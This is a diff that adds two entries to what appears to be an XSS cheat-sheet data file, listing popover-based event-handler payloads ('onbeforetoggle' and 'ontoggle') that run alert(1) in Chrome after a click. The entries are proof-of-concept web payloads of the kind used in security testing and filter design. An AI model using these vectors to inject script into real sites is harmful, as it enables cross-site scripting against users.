@@ -9382,5 +9382,31 @@
                 "hash":"#x"
             }
         ]
+    },
+    "onbeforetoggle": {
+        "description": "Fires before the a popop element is toggled",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<button popovertarget=x>Click me</button><* onbeforetoggle=alert(1) popover id=x>XSS<\/*>",
+                "browsers": [            
+                    "chrome"
+                ],
+                "interaction": true
+            }
+        ]
+    },
+     "ontoggle(popover)": {
+        "description": "Fires when the a popop element is toggled",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<button popovertarget=x>Click me</button><* ontoggle=alert(1) popover id=x>XSS<\/*>",
+                "browsers": [            
+                    "chrome"
+                ],
+                "interaction": true
+            }
+        ]
     }
 }
